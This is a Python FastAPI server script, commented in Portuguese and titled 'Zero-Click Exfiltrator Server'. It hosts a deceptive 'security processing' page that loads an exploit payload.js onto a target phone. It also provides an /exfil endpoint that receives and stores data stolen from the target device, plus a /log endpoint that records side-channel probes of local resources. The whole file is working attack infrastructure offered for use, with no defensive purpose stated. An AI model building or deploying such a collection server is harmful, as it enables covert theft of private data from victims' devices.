# zero_click_exfil_server.py
# Servidor FastAPI para hospedar o payload e receber dados exfiltrados.

from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse
from starlette.staticfiles import StaticFiles
import uvicorn
import json
import logging

# Configuração de Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(
    title="Zero-Click Exfiltrator Server",
    description="Servidor para hospedar o payload de exploração e coletar dados do dispositivo alvo.",
    version="1.0.0"
)

# --- Configuração do Payload Estático ---
# O payload.html será servido na raiz.
# O payload.js será servido como um arquivo estático.
app.mount("/static", StaticFiles(directory="/home/ubuntu/Avaliacao/static"), name="static")

# --- Payload HTML (A página que o celular clica) ---
@app.get("/", response_class=HTMLResponse, summary="Página de Exploração (Payload)")
async def get_payload_page(request: Request):
    """
    Esta é a página que o dispositivo alvo acessa após o clique automático.
    Ela carrega o JavaScript de exploração (payload.js).
    """
    logger.info(f"Dispositivo alvo acessou a página de exploração de: {request.client.host}")
    
    # O HTML minimalista que carrega o payload JS
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processando...</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="/static/payload.js"></script>
        <style>
            body { background-color: #0F1B2E; color: #00D9FF; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .message { text-align: center; }
        </style>
    </head>
    <body>
        <div class="message">
            <h1>Aguarde...</h1>
            <p>O sistema está processando a requisição de segurança.</p>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# --- Endpoint de Coleta de Dados (Exfiltração) ---
@app.get("/exfil", summary="Endpoint de Coleta de Dados")
async def exfil_data(request: Request, data: str = None):
    """
    Recebe os dados exfiltrados do dispositivo alvo via query parameter.
    """
    client_host = request.client.host
    
    if data:
        try:
            # Tenta decodificar o JSON se o payload enviar dados estruturados
            exfil_data = json.loads(data)
            logger.info(f"--- DADOS EXFILTRADOS DE {client_host} ---")
            logger.info(json.dumps(exfil_data, indent=4))
            logger.info("------------------------------------------")
            
            # Salva os dados em um arquivo de log
            with open("exfil_log.jsonl", "a") as f:
                f.write(json.dumps({"host": client_host, "data": exfil_data}) + "\n")
                
            return {"status": "success", "message": "Data logged successfully"}
        except json.JSONDecodeError:
            # Se não for JSON, loga como string
            logger.warning(f"Dados brutos exfiltrados de {client_host}: {data}")
            with open("exfil_log.jsonl", "a") as f:
                f.write(json.dumps({"host": client_host, "data": data}) + "\n")
            return {"status": "success", "message": "Raw data logged successfully"}
    else:
        logger.warning(f"Requisição de exfiltração vazia de {client_host}")
        return {"status": "error", "message": "No data provided"}

# --- Endpoint de Log de Tentativas (Side-Channel) ---
@app.get("/log", summary="Endpoint de Log de Tentativas")
async def log_attempt(request: Request, path: str, status: str):
    """
    Recebe o status de tentativas de acesso a recursos locais (Side-Channel).
    """
    client_host = request.client.host
    log_entry = f"[{client_host}] Tentativa de acesso a '{path}' - Status: {status}"
    logger.info(log_entry)
    
    with open("side_channel_log.txt", "a") as f:
        f.write(log_entry + "\n")
        
    return {"status": "success", "message": "Attempt logged"}

# --- Função para Iniciar o Servidor ---
def start_server():
    """Inicia o servidor Uvicorn."""
    logger.info("Iniciando Zero-Click Exfiltrator Server na porta 8000...")
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    # Cria o diretório 'static' se não existir
    import os
    if not os.path.exists("/home/ubuntu/Avaliacao/static"):
        os.makedirs("/home/ubuntu/Avaliacao/static")
        
    start_server()
